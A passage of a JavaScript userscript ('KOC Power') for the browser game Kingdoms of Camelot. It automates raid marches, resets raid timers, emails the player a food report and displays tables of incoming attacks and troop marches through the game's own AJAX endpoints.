  		                  		}		
  						  }
  						  else {
  						  		if (rslt.msg == "The system is busy, please try again later") setTimeout (t.DoAllStop, (2000),i);
  						  		else {
  					 	  			t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  					 	  			actionLog('<b>'+culang.stopraids+'</b> '+ Seed.cities[i][1] + ' - '+ rslt.msg + '');
  					 	  			updatebotbutton(''+culang.stopraids+': '+ t.stopprogress.toFixed(0) + '%', 'pbraidtab')
  					 	  			if (t.stopprogress.toFixed(0) == 100) {
  					 	  				 t.stopprogress = 0;
  					 	  				 setTimeout(function(){updatebotbutton(''+culang.stopraids+' ('+ t.activecount + ')', 'pbraidtab');t.stopping = false;}, (5000));
  					 	  			}
  					 	  		}
  					 	  }
  					 },
    });  
  },

  DoAllResume: function(i) {
    var t = Tabs.Raid;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  	params.pf = 0;
  	params.ctrl = 'BotManager';
  	params.action = 'resumeAll';
  	params.settings = {};
    params.settings.cityId = Seed.cities[i][0];
  	    		
  		 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  			  		method: "post",
  			         parameters: params,
  					 loading: true,
  					 onSuccess: function(transport){
  						var rslt = eval("(" + transport.responseText + ")");
  		                  if (rslt.ok) {
  		                  		t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  		                  		actionLog('<b>'+culang.raitack+'</b> '+ Seed.cities[i][1]);
  		                  		updatebotbutton(''+culang.raitack+': '+ t.stopprogress.toFixed(0) + '%', 'pbraidtabRes');
  		                  		if (t.stopprogress.toFixed(0) == 100) {
  		                  			 t.stopprogress = 0;
  		                  			 setTimeout(function(){updatebotbutton(''+culang.raitack+' ('+ t.stopcount + ')', 'pbraidtabRes');t.resuming = false;}, (5000));
  		                  		}		
  						  }
  						  else {
  						  		if (rslt.msg == "The system is busy, please try again later") setTimeout (t.DoAllResume, (2000),i);
  						  		else {
  					 	  			t.stopprogress = t.stopprogress + (100/Seed.cities.length);
  					 	  			actionLog('<b>'+culang.stopraids+'</b> '+ Seed.cities[i][1]  + ' - ' + rslt.msg);
  					 	  			updatebotbutton(''+culang.raitack+': '+ t.stopprogress.toFixed(0) + '%', 'pbraidtabRes')
  					 	  			if (t.stopprogress.toFixed(0) == 100) {
  					 	  				 t.stopprogress = 0;
  					 	  				 setTimeout(function(){updatebotbutton(''+culang.raitack+' ('+ t.stopcount + ')', 'pbraidtabRes');t.resuming = false;}, (5000));
  					 	  			}	
  					 	  		}
  					 	  }
  					 },
    });  
  },
  
  DoAllDelete : function (Id,city,count){
    	var t = Tabs.Raid;
    	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    	
    	cityID = 'city'+ Seed.cities[city][0];
    	
    	for (f in Seed.queue_atkp[cityID]){
    		if (Seed.queue_atkp[cityID][f]['marchId'] == Id) {
    				marchId = Seed.queue_atkp[cityID][f]['marchId'];
    				cityId = Seed.queue_atkp[cityID][f]['cityId'];
    				knightId = Seed.queue_atkp[cityID][f]['knightId'];
    				toTileLevel = Seed.queue_atkp[cityID][f]['toTileLevel'];
    				returnUnixTime = Seed.queue_atkp[cityID][f]['returnUnixTime'];
    				destinationUnixTime = Seed.queue_atkp[cityID][f]['destinationUnixTime'];
    				toXCoord = Seed.queue_atkp[cityID][f]['toXCoord'];
    				toYCoord = Seed.queue_atkp[cityID][f]['toYCoord'];
    				var units = {};
    				for (i=1;i<13;i++) units[i] = Seed.queue_atkp[cityID][f]['unit'+i+'Count'];
    		}
    	}
    	
    	params.pf = 0;
    	params.ctrl = 'BotManager';
    	params.action = 'deleteMarch';
    	params.marchId = marchId;
    	params.settings = {};
    	params.settings.cityId = cityId;
    	
      new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
    	         method: "post",
    	         parameters: params,
    			 loading: true,
    			 onSuccess: function(transport){
    				var rslt = eval("(" + transport.responseText + ")");
    	              if (rslt != "") {
    	              	  var serverID = getServerId();
    	              	  t.save = GM_getValue ('SavedRaids_'+serverID);
    	              	  if (t.save != undefined) t.save = JSON2.parse (t.save);
    	              	  if (t.save == undefined) t.save =new Array();
  
    	              	  t.save.push ({ marchId:		marchId, cityId:   		cityId, knightId:		knightId, toTileLevel:	toTileLevel, returnUnixTime:	destinationUnixTime, returnUnixTime:	returnUnixTime, toXCoord:		toXCoord, toYCoord:		toYCoord, unit1Count: 	units[1], unit2Count: 	units[2], unit3Count: 	units[3], unit4Count: 	units[4], unit5Count: 	units[5], unit6Count: 	units[6], unit7Count: 	units[7], unit8Count: 	units[8], unit9Count: 	units[9], unit10Count: 	units[10], unit11Count: 	units[11], unit12Count: 	units[12], });
						  var troops = Seed.units["city" + cityId];
	                      for (var u = 1; u <= 12; ++u) {
                          var troop_number = parseInt(rslt["unit" + u + "Return"]);
	                          if (isNaN(troop_number)) {
                              troop_number = parseInt(Seed.units["city" + cityId]["unt" + u]);
 	                          } else troop_number = parseInt(rslt["unit" + u + "Return"]) + parseInt(Seed.units["city" + cityId]["unt" + u]);

 	                          troops["unt" + u] = troop_number;

 	                      }
	                      for (u in Seed.queue_atkp['city' + cityId]){
 	                      	if (Seed.queue_atkp['city' + cityId][u]['marchId'] == marchId){
 								Seed.queue_atkp['city' + cityId][u] = "";
 	                      		unsafeWindow.seed.queue_atkp['city' + cityId] = Seed.queue_atkp['city' + cityId];
 	                      	}
 	                      }
 	                      for (u in Seed.knights['city' + cityId]){
 	                      	if (Seed.knights['city' + cityId][u]['knightId'] == knightId){
	                      		Seed.knights['city' + cityId][u]["knightStatus"] = 1;
	                      		unsafeWindow.seed.knights['city' + cityId] = Seed.knights['city' + cityId];
 	                      	}
 	                      }
    	              	  setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
                          unsafeWindow.cityinfo_army();	  
    	                  setTimeout(unsafeWindow.update_seed_ajax, 250);
    	                  t.GetRaids(cityId);
    					}
    			 },
    	 });
  		  	 t.stopprogress = count * (100/t.count);
  		  	 actionLog('<b>'+culang.deleteraid+'</b> '+ Seed.cities[city][1]);
  		  	 updatebotbutton(''+culang.deleteraid+': '+ t.stopprogress.toFixed(0) + '%', 'pbraidtabDel');
  		  	 if (t.stopprogress.toFixed(0) == 100) {
  		  	 	 t.stopprogress = 0;
				 t.GetRaids(cityId);
  		  	 	 setTimeout(function(){updatebotbutton(''+culang.deleteraid+' ('+ t.stopcount + ')', 'pbraidtabDel');t.deleting  = false;}, (5000));
  	}	
    	 
},
  
      
  DeleteCityRaids : function (){
      	var t = Tabs.Raid;
      	alert(''+culang.btnnotadded+'');
  	
      },
        
    	
  AddRaid : function (Id){
    	var t = Tabs.Raid;
    	var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    	update = {};
    	
    	params.pf = 0;
    	params.ctrl = 'BotManager';
    	params.action = 'saveMarch';
    	params.settings = {};
    	params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};
    	
    	for (y in t.save){
    		if (t.save[y]['marchId'] == Id){
	    		params.settings.cityId = t.save[y]['cityId'];
	    		params.queue[0].cityMarches.knightId = t.save[y]['knightId']; //parseInt(document.getElementById('AddKnights').value);
	    		params.queue[0].cityMarches.toXCoord = t.save[y]['toXCoord'];
	    		params.queue[0].cityMarches.toYCoord = t.save[y]['toYCoord'];
	    		params.queue[0].cityMarches.unit0Count = 0;
	    		params.queue[0].cityMarches.unit1Count = t.save[y]['unit1Count'];
	    		params.queue[0].cityMarches.unit2Count = t.save[y]['unit2Count'];
	    		params.queue[0].cityMarches.unit3Count = t.save[y]['unit3Count'];
	    		params.queue[0].cityMarches.unit4Count = t.save[y]['unit4Count'];
	    		params.queue[0].cityMarches.unit5Count = t.save[y]['unit5Count'];
	    		params.queue[0].cityMarches.unit6Count = t.save[y]['unit6Count'];
	    		params.queue[0].cityMarches.unit7Count = t.save[y]['unit7Count'];
	    		params.queue[0].cityMarches.unit8Count = t.save[y]['unit8Count'];
	    		params.queue[0].cityMarches.unit9Count = t.save[y]['unit9Count'];
	    		params.queue[0].cityMarches.unit10Count = t.save[y]['unit10Count'];
	    		params.queue[0].cityMarches.unit11Count = t.save[y]['unit12Count'];
	    		params.queue[0].cityMarches.unit12Count = t.save[y]['unit12Count'];
    		}
    	}	
    	 
    	 new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
    		  		method: "post",
    		         parameters: params,
    				 loading: true,
    				 onSuccess: function(transport){
    					var rslt = eval("(" + transport.responseText + ")");
    	                  if (rslt.ok) {
								t.GetRaids(params.settings.cityId);
      					        unsafeWindow.cityinfo_army();
      	                  		setTimeout(unsafeWindow.update_seed_ajax, 250);
      	                  		for (yy=0;yy<t.save.length;yy++){
      	                  			if (t.save[yy]['marchId'] == Id){
      	                  				  t.save.splice (yy,1);
      	                  			}	
      	                  		}
      	                  		var serverID = getServerId();
      	                  		setTimeout (function (){GM_setValue ('SavedRaids_'+serverID, JSON2.stringify(t.save));}, 0);
      	                  		t.paint();
    					 } else {
    					 	 /* var pop = new CPopup ('pbEditRaid', 0,0, 750,250, true);
				 		  	  if (t.popFirst){
				 		  	    pop.centerMe (mainPop.getMainDiv());  
				 		  	    t.popFirst = false;
				 		  	  }
				 		  	  pop.getTopDiv().innerHTML = '<CENTER><B>ERROR</b></center>';
				 		  	  var m= '<TABLE id=pbRaidAdd width=100% height=0% class=pdxTab><TR align="center">';
				 			  m +=  '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/merlin_img.jpg"></td>';
				 			  m+='<TD style="align;left; max-width:200px; text-wrap:normal;word-wrap:break-word"><B>'+ rslt.msg+'</b></td>';
				 		  	  m+='<TD><CENTER>'+ strButton20('OK', 'id=pbOK') +'</center></td></tr>';
				 		  	  pop.getMainDiv().innerHTML = m;
				 			  document.getElementById('pbOK').addEventListener ('click', function(){pop.show (false)},false);
				 		  	  pop.show (true);*/
				 		  	  alert('Error: '+ rslt.msg);  	
    					 }
    				 },
    		 });    	
    },
    
        
  getKnights : function(cityId){
         var t = Tabs.Raid;
         var knt = new Array();
         var status ="";
         for (k in Seed.knights['city' + cityId]){
         		if ( Seed.leaders['city' + cityId]["resourcefulnessKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["politicsKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["combatKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["intelligenceKnightId"] != Seed.knights['city' + cityId][k]["knightId"]){
         		   if (Seed.knights['city' + cityId][k]["knightStatus"] == 1 ) status = "Free";
         		   else status = ""+culang.march+"";
         			knt.push ({
         				Name:   Seed.knights['city' + cityId][k]["knightName"],
         				Combat:	parseInt(Seed.knights['city' + cityId][k]["combat"]),
         				ID:		Seed.knights['city' + cityId][k]["knightId"],
         				Status: status,
         			});
         		}
         }
         knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
         document.getElementById('AddKnights').options.length=0;
  		var o = document.createElement("option");
  		o.text = '-- '+culang.selKnight+' --';
  		o.value = 0;
  		document.getElementById("AddKnights").options.add(o);
         for (k in knt){
      			if (knt[k]["Name"] !=undefined){
  	    			var o = document.createElement("option");
  	    			o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +') (' + knt[k]["Status"] +')');
  	    			o.value = knt[k]["ID"];
  	    			document.getElementById("AddKnights").options.add(o);
      			}
      	}
      },
  
    
  clickCitySelect : function (city){
  	var t = Tabs.Raid;
  	t.cityId = city['id'];
  	t.GetRaids(t.cityId);
  },
  
  checkRaids : function (){
	var t = Tabs.Raid;
	var now = unixTime();
	if(!Options.RaidRunning) return;
	if ( (now - Options.RaidReset) > 7200 ) {
		Options.RaidReset = now;
		saveOptions();
		for (g=0;g<Seed.cities.length;g++){
				t.citiesdone = "";
				setTimeout(t.resetRaids, (1500*g), Seed.cities[g][0],Seed.cities[g][1]);
		}
		setTimeout(t.postLog, 30000);
	}
	t.raidtimer = setTimeout(t.checkRaids, 900000);
  },
  
  GetRaids : function(cityId){
  		var t = Tabs.Raid;
  		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  		  		
  		params.pf = 0;
  		params.ctrl = 'BotManager';
  		params.action = 'getMarches';
  		params.settings = {};
  		params.settings.cityId = cityId;
  		
  		
   		new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  				 loading: true,
  				 onSuccess: function(transport){
  					var rslt = eval("(" + transport.responseText + ")");
                        if (rslt.ok) {
                        	t.rslt = rslt;
  							t.paint();
  							unsafeWindow.cityinfo_army();
  							setTimeout(unsafeWindow.update_seed_ajax, 250);
  						}
  				 },
  		 });
  },
  
  
  resetRaids : function(cityId,cityName){
  		var t = Tabs.Raid;
  		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  		  		
  		params.pf = 0;
  		params.ctrl = 'BotManager';
  		params.action = 'resetRaidTimer';
		params.settings = {};
  		params.settings.cityId = cityId;
  		
  		
   		new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
				 loading: true,
				 
				onSuccess:function(transport) {
				var rslt = eval("(" + transport.responseText + ")");
				if (rslt.ok){
				unsafeWindow.cityinfo_army();
				setTimeout(unsafeWindow.update_seed_ajax, 250);
				t.citiesdone += cityName + ' ';
						}
				 },
  		 });
  },
  postLog : function (){
	  		var t = Tabs.Raid;
	  		actionLog('<b>'+culang.actionRaid1+'</b> '+culang.actionRaid2 +' ' + t.citiesdone);
 	  },
sendreport: function(){
	  var t = Tabs.Raid;
	  if(!Options.foodreport) return;
	   var now = new Date().getTime()/1000.0;
	   now = now.toFixed(0);
	   if (now < (parseInt(Options.LastReport)+(Options.MsgInterval*60*60))) return;
	   var total = 0;
	   var message = ''+culang.raidStats+': %0A';
	   message += '%0A '+culang.raidStats2+' '+ Options.MsgInterval +' '+culang.raidStats3+' %0A';
    for (q=1;q<=Seed.cities.length;q++){
    	var cityID = 'city' + Seed.cities[q-1][0];
    	var gain = parseInt(Seed.resources[cityID]['rec1'][0] / 3600) - Options.Foodstatus[q];
    	message+= Seed.cities[q-1][1] + ': '+culang.raidStats5+': ' + addCommas(Options.Foodstatus[q]) + ' - '+culang.raidStats6+':' + addCommas(parseInt(Seed.resources[cityID]['rec1'][0] / 3600)) + ' - '+culang.raidGain+': ';
    	message += addCommas(gain)  + '%0A';
		total += gain;
		Options.Foodstatus[q] = parseInt(Seed.resources[cityID]['rec1'][0] / 3600);
    }
	message += '%0A '+culang.raidStats4+': '+addCommas(total)+'%0A';
var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.emailTo = Seed.player['name'];
	    params.subject = ""+culang.raidStats+"";
    params.message = message;	 
    params.requestType = "COMPOSED_MAIL";
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function (message) {
            var rslt = eval("(" + message.responseText + ")");
            if (rslt.ok) {
            } else {
            }
        },
        onFailure: function () {
        },
    });
  Options.LastReport = now;
  saveOptions();
  },
  
  toggleRaidState : function (){
  	var t = Tabs.Raid;
  	if(Options.RaidRunning){
  		Options.RaidRunning = false;
  		t.raidtimer = null;
  		document.getElementById('pbRaidStart').value = ''+culang.raidreset+' = '+culang.buttonoff;
  	} else {
  		Options.RaidRunning = true;
  		t.raidtimer = setTimeout(t.checkRaids, 5000);
  		document.getElementById('pbRaidStart').value = ''+culang.raidreset+' = '+culang.buttonon;
  	}
	saveOptions();
  },
  
    
  hide : function (){
        var t = Tabs.Raid;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
        var t = Tabs.Raid;
        mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
 };
/***********************************************************************************/
/************ KOC POWER - TABS MARCHES ********************************************/
/*********************************************************************************/
Tabs.Marches = {
  tabLabel : culang.march,
  tabOrder : StyleOptions.toMarsch,
  cont:null,
  displayTimer:null,
  curTabBut : null,
  curTabName : null,
  state : null,
  
  hide : function (){
      var t = Tabs.Marches;
      clearTimeout (t.displayTimer);
  },
  
  show : function (){
   var t = Tabs.Marches;
       clearTimeout (t.displayTimer);
       if (t.curTabName == 'Z')
         t.showReinforcementsOut();
       else if (t.curTabName == 'R')
         t.showReinforcements();
       else if (t.curTabName == 'M')
         t.showMarches(9);
       else
      t.showAttacks();
  },
  init : function (div){  
    var t = Tabs.Marches; 
    t.cont = div;
    unsafeWindow.pr58Recall = t.ajaxRecall;
    unsafeWindow.raid_delete = t.ajaxDeleteRaid;
    unsafeWindow.r8x6Home = t.butSendHome;
    unsafeWindow.pr57Recall = t.butRecall2;
  
    var atkclass='';
    if(Seed && Seed.queue_atkinc) {
      for(k in Seed.queue_atkinc){
        m = Seed.queue_atkinc[k];
        if (m.marchType == 4){
    	   atkclass = 'style="background-color:#FF9999;"';
    	 }
      }
    }
    
 t.cont.innerHTML = '<div class=pdxStat>'+culang.HtabMarches+'</div><TABLE class=pdxTab align=center><TR><TD><INPUT class=pbSubtab ID=BoptmrchSubM type=submit value="'+culang.marches+'"></td>\
          <TD><INPUT class=pbSubtab ID=BoptmrchSubA type=submit '+atkclass+' value="'+culang.attacks+'"></td>\
          <TD><INPUT class=pbSubtab ID=BoptmrchSubR type=submit value="'+culang.embassy+'"></td>\
          <TD><INPUT class=pbSubtab ID=BoptmrchSubZ type=submit value="'+culang.stdef+'"></td></tr></table>\
      <DIV id="BoptMarchOutput" style="margin-top:5px; max-height:730px;overflow:auto"></div>';
     t.marchDiv = document.getElementById('BoptMarchOutput'); 
    document.getElementById('BoptmrchSubA').addEventListener('click', e_butSubtab, false);
    document.getElementById('BoptmrchSubR').addEventListener('click', e_butSubtab, false);
    document.getElementById('BoptmrchSubM').addEventListener('click', e_butSubtab, false);
    document.getElementById('BoptmrchSubZ').addEventListener('click', e_butSubtab, false);
    
       if (atkclass!='') {
       changeSubtab (document.getElementById('BoptmrchSubA'));  
       }else {
       changeSubtab (document.getElementById('BoptmrchSubM'));  
       }
       
      function e_butSubtab (evt){
          changeSubtab (evt.target);   
      }
    
      function changeSubtab (but){
          if (but == t.curTabBut)
            return;
          if (t.curTabBut){
            t.curTabBut.className='pbSubtab'; 
            t.curTabBut.disabled=false;
          }
          t.curTabBut = but;
          but.className='pbSubtab pbSubtabSel'; 
          but.disabled=true;
          t.curTabName = but.id.substr(11);
          if (Options.currentTab=="Marches") t.show2();
      }  
    
  },
  show2 : function (){
    var t = Tabs.Marches;
    t.state = null;
    clearTimeout (t.displayTimer);
    if (t.curTabName == 'Z')
      t.showReinforcementsOut();
    else if (t.curTabName == 'R')
      t.showReinforcements();
    else if (t.curTabName == 'M')
      t.showMarches(9);
    else
      t.showAttacks();
  },
 
   /***   ATTACKS SUBTAB  ***/
  showAttacks : function (){
      var t = Tabs.Marches;
      clearTimeout (t.displayTimer);
      var now = unixTime();
      var target, atkType, who, atkclass;
      t.marchDiv.innerHTML = "<br>"+culang.loading+"<br><i></i>"; 
      var s = '<div class=pdxStat>'+culang.HTMincomming+'</div><table border=0 cellspacing=0 cellpadding=0 width=100%><tr><td>'+culang.showatk+': <select id="BoFiltreAttack"><option value="0">'+culang.all+'</option></select></td><td><input type=button value="'+culang.helpbutton+'" onclick="alert(\''+culang.atkhelp+' \');"></font></td></table>';
      s += '<STYLE> .eclkk{background:#ffff55;} .attackkk{background:#ff5555;} .attackkA{background:#ff9955;}</style>';
      s += '<TABLE border=0 cellspacing=0 cellpadding=2 width=100%>';
      s += '<tr><td width=55><b>'+culang.arrival+'</td><td width=60><b>'+culang.def+'</td><td width=140 colspan=2><b>'+culang.holyplace+'</td><td width=150 colspan=2><b>'+culang.victim+'</td><td width=35><b>'+culang.distance+'</td><td width=25><b>'+culang.knights+'</td><td><b>'+culang.troops+'</td></tr>';  
	  var at=0;
      if(Seed && Seed.queue_atkinc) {
       var sortem = [];    
       for (var k in Seed.queue_atkinc) 
          sortem.push (Seed.queue_atkinc[k]);
          
        sortem.sort (function (a,b){
          var x; if ((x = a.arrivalTime-b.arrivalTime)!=0) 
            return x; 
          return b.arrivalTime-a.arrivalTime;
        });    
                
       //for(k in Seed.queue_atkinc){
       //	m = Seed.queue_atkinc[k];
       for (i=0; i<sortem.length; i++){
          var m = sortem[i]; 
      
      	if (m.marchType == 3){
	      atkType = ''+culang.scout+'';
	      atkclass = 'eclkk';
	    } else if (m.marchType == 4){
	      atkType = ''+culang.rptattack+'';
	      atkclass = 'attackkk';
	       var nbtroupe=0;
	       for (k in m.unts){
	                nbtroupe += parseInt(m.unts[k]);
                }
	        if (nbtroupe==1) {
	         atkclass = 'attackkA';
	        }
	      
	    } else {
	      atkType ="?";//return;
	      atkclass = '';
    	 }
    	 if (atkclass !='') {  // Seulement les vraies attaques !
    	 at++;
    	 s += '<tr align=left >';
    	  
    	 var arrivedans = unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime()));
    	 //s += '<td class="'+atkclass+'">' + atkType + '</td>';
    	 s += '<td class="'+atkclass+'">' + arrivedans +'</td>';
    	 var couelur="";
    	 var city = Cities.byID[m.toCityId];
    	 if (city.tileId == m.toTileId) {
           target = '<a onclick="citysel_click(document.getElementById(\'citysel_'+ (city.idx+1)+'\'));">'+ city.name.substring(0,10) +'</a>';
           cityID = 'city'+ m.toCityId;
	   Gate = parseInt(Seed.citystats[cityID].gate);
	   if(Gate == 0) {
	   	bouttt = '<input type=button value="'+culang.Hdef+' '+culang.buttonoff+'" id="but_'+m.toCityId+'" style="background-color:#00AA00;padding:2px;border:1px solid yellow;">';
	   	}	   else {
		bouttt = '<input type=button value="'+culang.Hdef+' '+culang.buttonon+'" id="but_'+m.toCityId+'" style="background-color:red;">';
		}
		   coordos = ''+pdxkoordlink(city.x,city.y)+'';
         } else {
           target = 'TS';
           bouttt='';
           for (k in Seed.wilderness['city'+m.toCityId]){
            if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
             coordos = ''+pdxkoordlink(Seed.wilderness['city'+m.toCityId][k].xCoord,Seed.wilderness['city'+m.toCityId][k].yCoord)+''; 
			break;           
            }
           }
         }  
         s += '<td class="'+atkclass+'" align=center>'+bouttt+'</td><td class="'+atkclass+'" align=center><b>' + target + '<td class="'+atkclass+'" align=center>'+coordos+'</b></td>';
         
         if (Seed.players['u'+m.pid]) {
	    who = '<span>'+Seed.players['u'+m.pid].n +'<br>'+addCommas(Seed.players['u'+m.pid].m)+'</span>';
	 
	 } else if (m.players && m.players['u'+m.pid]) {
	    who = m.players['u'+m.pid].n;
	 } else{
	    who = ''+culang.botStatUnknown+'';
	
      	 }
      	 if (m.fromXCoord) { 
		  who += '</td><td class="'+atkclass+'"> '+pdxkoordlink(m.fromXCoord,m.fromYCoord)+'';
      	 } else {
      	  who += '</td><td class="'+atkclass+'">???</a></td>';
      	 }
      	 s += '<td class="'+atkclass+'">' + who + '</td>';
      	 if (m.fromXCoord) {
      	  s +='<td class="'+atkclass+'">'+ distance(city.x,city.y,m.fromXCoord,m.fromYCoord) +'</td>';
      	 } else {
      	   s +='<td class="'+atkclass+'">&nbsp;</td>';
      	 }
         var troupe = "";
         for (k in m.unts){
          var uid = parseInt(k.substr (1));
          troupe += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +'<br>';
         }
		var knh='&nbsp;';
		if (m.knt) {
			for (k in m.knt){
			knh=parseInt(m.knt[k]);
		}        
         }
		s += '<td class="'+atkclass+'">'+knh+'</td>';
		s += '<td class="'+atkclass+'">' + troupe +'</td>';
		s += '</tr>';
         }
      	}  
      	if (at==0) {
      	 s ="<tr><colspan=4><div class=pdxStat>"+culang.HTMincomming+"</div><br><b><center>"+culang.MTnoatk+"</center></b></td></tr>";
      	}
      } 
      s+='</table>';
      t.marchDiv.innerHTML = s; 
      
      for (var cityId in Cities.byID){
      	var but = document.getElementById ('but_'+ cityId);
      	if (but) {
      	  //t.displayDefMode (cityId);
      	  addListener (but, cityId);
         }
      }
      			  
       function addListener (but, i){
      	 but.addEventListener ('click', function (){t.butToggleDefMode(i)}, false);
       }
      
      t.displayTimer = setTimeout (t.showAttacks, 900);
    },
    
    butToggleDefMode : function (cityId){
        var t = Tabs.Marches;
        var mode = 1;
        if (Seed.citystats["city" + cityId].gate != 0)
          mode = 0;
          t.ajaxSetDefMode (cityId, mode, function (newMode){
            t.defMode[cityId] = newMode;
            t.displayDefMode (cityId);
          });
    },
      displayDefMode : function (cityId){
        var t = Tabs.Marches;
        var but = document.getElementById('but'+ cityId);
        if (t.defMode[cityId]){
          but.style.backgroundColor = 'red';
        } else {
          but.style.backgroundColor = '#00AA00'; 
        }  
  },
    ajaxSetDefMode : function (cityId, state, notify){
    		var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    		params.cid = cityId;
    		params.state = state;
    		new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
    			method: "post",
    			parameters: params,
    			onSuccess: function (rslt) {
    				if (rslt.ok) {
    					Seed.citystats["city" + cityId].gate = state;
    					notify (state);
    				} 
    			},
    			onFailure: function () {
    			}
    		})
     },
/**********************************************************/
/************ KOC POWER - SUBTABS MARCHES ****************/
/********************************************************/
    showMarches : function (numville){
 
      var t = Tabs.Marches;
      var rownum = 0;
      var now = unixTime();
      var names = [''+culang.shrsupply+'', ''+culang.shrmilitiaman+'', ''+culang.scout+'', ''+culang.shrpikeman+'', ''+culang.shrswordsman+'', ''+culang.shrtarcher+'', ''+culang.shrcavalry+'', ''+culang.shrheavycavalry+'', ''+culang.shrsupplywagon+'', ''+culang.shrballista+'', ''+culang.shrbatteringram+'', ''+culang.shrcatapult+''];      clearTimeout (t.displayTimer);
      if (t.state == null){       
       var s = '<div class=pdxStat>'+culang.HTMtroop+'</div><BR><b>'+culang.hideraids+':</b> <input id=BOVoirRaid type=checkbox '+ (!Options.voirRaid?'':' CHECKED ') +'>';  
       s += '<STYLE> .tot{background:#f0e0f8;} .city{background:#ffffaa;}</style><input style="font-size:12px" type=button id="9_CityButton" value="0">';
       for (var c=0; c<Cities.numCities; c++){
            s += '<input style="font-size:12px" type=button id="'+ c +'_CityButton" value="' + (parseInt(c)+1) + ' : '+ Cities.cities[c].name.substring(0,10) +'">';
       }
       s += '<div id="showMarchDiv"></div>';
       t.marchDiv.innerHTML = s;
       
       document.getElementById('BOVoirRaid').addEventListener('click', function() {
       
         Options.voirRaid = document.getElementById('BOVoirRaid').checked;
         saveOptions();
         
       }, false);
       
       document.getElementById("9_CityButton").addEventListener('click', function(){
                           var t = Tabs.Marches;
                           clearTimeout (t.displayTimer);
                           t.showMarches(this.id.substring(0,1));
                           
       }, false);
       
       for (var c=0; c<Cities.numCities; c++){
          document.getElementById(c + "_CityButton").addEventListener('click', function(){
                    var t = Tabs.Marches;
                    clearTimeout (t.displayTimer);
                    t.showMarches(this.id.substring(0,1));
                    
           }, false);
       
       }
       
       t.state = 1; 
      }
      
      s = '<TABLE cellspacing=0 cellpadding=2 width=100%>';
      tot = [];
      for (i=0; i<13; i++)  tot[i] = 0;
      
      var c = numville;
      
      if (numville==9) {
        
        for (var c=0; c<Cities.numCities; c++){
          var que = Seed.queue_atkp['city'+ Cities.cities[c].id];
          if (matTypeof(que)=='object') {
            var a=0;
            for (k in que) {
              march = que[k]; 
              if ((march.marchType!=2 && !Options.voirRaid) || (march.marchType!=9 && march.marchType!=2 && Options.voirRaid) ) {
                 a++;
                 if (a==1) {
      	             var cityID = 'city'+ Cities.cities[c].id;
      	             var slots=0;
		     for(var z in Seed.queue_atkp[cityID])
		     	slots++;      
      	             var niveauPointRall=parseInt(getCityBuilding (Cities.cities[c].id, 12).maxLevel); 
      	             if (niveauPointRall==12) niveauPointRall=11; 
      	  	     s+= '<TR><TD class="city">'+culang.shrrp+': '+slots+'/'+niveauPointRall+'</td><TD class="city" colspan=19 align=center><font size=3><B><i><u>'+culang.holyplace+' ' + (parseInt(c)+1) + ' - '+ Cities.cities[c].name +'</b></td></tr>';
      	         }
                 var mid = k.substr(1);
                 knight = '';
                 if (Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"] !=0){
		  for (i in Seed.knights['city'+ Cities.cities[c].id]) {
		    if (i == ("knt" + Seed.queue_atkp['city'+ Cities.cities[c].id][k]["knightId"]) ) knight = '' +Seed.knights['city'+ Cities.cities[c].id][i]["combat"] +'';
		  }
  		 } else knight = '';
                var playerId = march.toPlayerId;
                if (playerId==undefined) playerId=0;
                var cityId = march.toCityId;
                var tileType = parseInt(march.toTileType);
                var tileLevel = march.toTileLevel;
                var who = ''+culang.botStatUnknown+'';
                if (Seed.players['u' + playerId]) {
		 who = Seed.players['u' + playerId].n;
		}
		if (march.marchType==1) {
		  var player = "<span>"+culang.city+" "+culang.lvl+" "+ tileLevel +"</span>";
		}else {
		  var player = "<span title='"+culang.needRefresh+"'>"+culang.rptbarb+" "+culang.lvl+" "+ tileLevel +"</span>";
		}
		if (march.marchType==10 || march.marchType==11) { 
		  var player = "<span>"+culang.darkforest+" "+culang.lvl+" "+ tileLevel +"</span>";
		}
